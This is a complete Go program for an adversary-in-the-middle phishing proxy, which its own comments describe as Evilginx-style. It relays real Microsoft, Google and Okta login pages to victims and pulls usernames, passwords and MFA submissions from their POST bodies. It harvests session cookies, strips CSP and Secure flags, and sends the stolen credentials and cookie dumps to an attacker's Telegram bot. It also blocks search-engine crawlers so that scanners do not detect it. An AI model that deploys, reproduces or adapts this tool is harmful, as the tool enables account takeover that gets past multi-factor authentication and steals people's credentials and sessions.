// proxy-server — Evilginx-style AiTM reverse proxy with Telegram capture.
// Victim sees the REAL login page (Microsoft/Google/Okta) proxied through us.
// Credentials and session cookies captured and sent to Telegram.

package main

import (
	"bytes"
	"crypto/tls"
	"embed"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

//go:embed bootloader.html
var bootloaderFS embed.FS

var (
	telegramToken  string
	telegramChatID string
	phishingHost   string
)

func main() {
	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
	phishingHost = os.Getenv("PHISHING_HOST")
	if phishingHost == "" {
		phishingHost = "localhost:9090"
	}

	port := os.Getenv("PORT")
	if port == "" {
		port = "9091"
	}

	bootloaderHTML, err := bootloaderFS.ReadFile("bootloader.html")
	if err != nil {
		log.Fatalf("FATAL: cannot read embedded bootloader.html: %v", err)
	}
	log.Printf("Bootloader loaded: %d bytes", len(bootloaderHTML))

	rl := NewRateLimiter()

	mux := http.NewServeMux()
	mux.HandleFunc("GET /{$}", rl.Middleware(func(w http.ResponseWriter, r *http.Request) {
		handleRequest(w, r, bootloaderHTML)
	}))
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	// Catch-all 404 — avoids Go's default "404 page not found" fingerprint
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body></body></html>"))
	})

	log.Printf("Proxy server listening on :%s", port)
	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
	log.Fatal(http.ListenAndServe(":"+port, handler))
}

// handleRequest is the main dispatcher: bootloader or proxy.
func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte) {
	// If victim has _s cookie set, they're in the proxy flow
	upstreamCookie, err := r.Cookie("_s")
	if err != nil || upstreamCookie.Value == "" {
		// No cookie — serve bootloader
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(bootloaderHTML)
		return
	}

	upstreamURL, _ := url.QueryUnescape(upstreamCookie.Value)
	if upstreamURL == "" || !strings.HasPrefix(upstreamURL, "http") {
		w.Write(bootloaderHTML)
		return
	}

	// Proxy the request to the real target
	serveProxy(w, r, upstreamURL)
}

// serveProxy reverse-proxies the request to the real login page.
func serveProxy(w http.ResponseWriter, r *http.Request, upstream string) {
	target, err := url.Parse(upstream)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	// Capture POST body (credentials, MFA codes)
	var reqBody []byte
	if r.Body != nil && r.Method == "POST" {
		reqBody, _ = io.ReadAll(r.Body)
		r.Body = io.NopCloser(bytes.NewReader(reqBody))
	}

	// Capture incoming cookies from victim
	victimCookies := r.Cookies()

	proxy := &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = target.Scheme
			req.URL.Host = target.Host
			req.Host = target.Host

			// Rewrite Referer to hide our domain
			if req.Header.Get("Referer") != "" {
				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
					phishingHost, target.Host, 1))
			}

			// Don't forward our tracking cookies to upstream
			req.Header.Del("Cookie")
			for _, c := range victimCookies {
				if c.Name != "_s" {
					req.AddCookie(c)
				}
			}
		},
		ModifyResponse: func(resp *http.Response) error {
			// Capture Set-Cookie headers from upstream (session tokens!)
			capturedCookies := resp.Header.Values("Set-Cookie")

			// Rewrite response: change upstream domain → our domain in cookies and HTML
			rewriteResponse(resp, target.Host, phishingHost)

			// Fire capture notification
			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream)

			return nil
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	proxy.ServeHTTP(w, r)
}

// rewriteResponse rewrites URLs, cookies, and CSP headers so the victim's browser
// continues to route through our proxy.
func rewriteResponse(resp *http.Response, upstreamHost, ourHost string) {
	// Rewrite Set-Cookie domain
	cookies := resp.Header.Values("Set-Cookie")
	resp.Header.Del("Set-Cookie")
	for _, c := range cookies {
		// Strip domain= from cookies so they work on our domain
		c = strings.ReplaceAll(c, "domain="+upstreamHost, "")
		c = strings.ReplaceAll(c, "domain=."+upstreamHost, "")
		c = strings.ReplaceAll(c, "Domain="+upstreamHost, "")
		c = strings.ReplaceAll(c, "Domain=."+upstreamHost, "")
		c = strings.ReplaceAll(c, "; Secure", "") // Allow over HTTP
		resp.Header.Add("Set-Cookie", c)
	}

	// Strip CSP headers (they block our proxy modifications)
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("Content-Security-Policy-Report-Only")

	// Strip X-Frame-Options (some login pages block framing)
	resp.Header.Del("X-Frame-Options")
}

// notifyCapture sends captured credentials and session cookies to Telegram.
func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string) {
	telegramOk := telegramToken != "" && telegramChatID != ""
	if !telegramOk {
		log.Println("[telegram] bot not configured — skipping notification")
	}

	// Parse form data from POST body
	var username, password string
	if len(reqBody) > 0 {
		bodyStr := string(reqBody)
		// Quick parse of common form field names
		for _, field := range []string{"login", "username", "email", "loginfmt"} {
			if v := extractFormField(bodyStr, field); v != "" {
				username = v
				break
			}
		}
		for _, field := range []string{"passwd", "password", "Password", "secret"} {
			if v := extractFormField(bodyStr, field); v != "" {
				password = v
				break
			}
		}
		// If still no username, try the first field
		if username == "" {
			username = extractFirstField(bodyStr)
		}
	}

	// Write analytics event to shared JSONL
	captureTime := time.Now().UTC().Format(time.RFC3339)
	campaignCookie, _ := r.Cookie("_c")
	campaignID := ""
	if campaignCookie != nil {
		campaignID = campaignCookie.Value
	}
	writeEvent(map[string]interface{}{
		"timestamp":   captureTime,
		"campaign_id": campaignID,
		"brand":       getBrand(upstream),
		"username":    username,
		"ip":          r.RemoteAddr,
		"user_agent":  r.UserAgent(),
		"status":      "success",
		"source":      "proxy",
	})

	if !telegramOk {
		return
	}

	// Build Telegram message
	captureTimeDisplay := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
	ip := r.RemoteAddr
	ua := r.UserAgent()

	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
		"Username: %s\n"+
		"Password: %s\n"+
		"IP: %s\n"+
		"User-Agent: %s\n"+
		"Time: %s\n"+
		"Upstream: %s",
		getBrand(upstream), username,
		username, password,
		ip, ua,
		captureTimeDisplay, upstream)

	// Send message
	sendTelegramMessage(msg)

	// Build .txt attachment with session cookies
	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
			"Target: %s\nUsername: %s\nIP: %s\nTime: %s\n\n--- Session Cookies ---\n",
			upstream, username, ip, captureTimeDisplay)

		for _, c := range capturedCookies {
			txtContent += c + "\n"
		}
		for _, c := range victimCookies {
			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
		}

		filename := fmt.Sprintf("session-%s.txt", time.Now().UTC().Format("20060102-150405"))
		sendTelegramDocument(msg, filename, []byte(txtContent))
	}
}

func extractFormField(body, field string) string {
	// Simple form field extraction (handles urlencoded and multipart)
	for _, part := range strings.Split(body, "&") {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) == 2 {
			key, _ := url.QueryUnescape(kv[0])
			val, _ := url.QueryUnescape(kv[1])
			if strings.EqualFold(key, field) {
				return val
			}
		}
	}
	return ""
}

func extractFirstField(body string) string {
	for _, part := range strings.Split(body, "&") {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) == 2 && kv[1] != "" && !strings.Contains(kv[0], "uuid") && !strings.Contains(kv[0], "redirect") && !strings.Contains(kv[0], "csrf") {
			val, _ := url.QueryUnescape(kv[1])
			return val
		}
	}
	return ""
}

func getBrand(upstream string) string {
	switch {
	case strings.Contains(upstream, "microsoft") || strings.Contains(upstream, "office"):
		return "Microsoft"
	case strings.Contains(upstream, "google") || strings.Contains(upstream, "gmail"):
		return "Google"
	case strings.Contains(upstream, "okta"):
		return "Okta"
	default:
		return "Unknown"
	}
}

// ---- Telegram API ----

func sendTelegramMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("text", text)
	w.Close()

	req, _ := http.NewRequest("POST", url, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send message error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] message sent")
}

func sendTelegramDocument(caption, filename string, content []byte) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("caption", caption)
	part, _ := w.CreateFormFile("document", filename)
	part.Write(content)
	w.Close()

	req, _ := http.NewRequest("POST", url, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send document error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] document sent: %s", filename)
}

func writeEvent(ev map[string]interface{}) {
	raw, err := json.Marshal(ev)
	if err != nil {
		log.Printf("[jsonl] marshal error: %v", err)
		return
	}
	// Writes with 0600 permissions — analytics server must run as same user to decrypt/read
	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("[jsonl] open error: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.Write(append(raw, '\n')); err != nil {
		log.Printf("[jsonl] write error: %v", err)
	}
}

// --- Security middleware ---

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

var botPatterns = []string{
	"Googlebot", "Bingbot", "Baiduspider", "DuckDuckBot",
	"YandexBot", "Slurp", "Facebot", "Twitterbot",
	"PetalBot", "Applebot", "AhrefsBot", "SemrushBot",
	"DotBot", "Screaming Frog", "Bytespider",
}

func blockBots(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua := r.UserAgent()
		for _, p := range botPatterns {
			if strings.Contains(ua, p) {
				w.WriteHeader(http.StatusNotFound)
				w.Write([]byte("<html><body></body></html>"))
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}
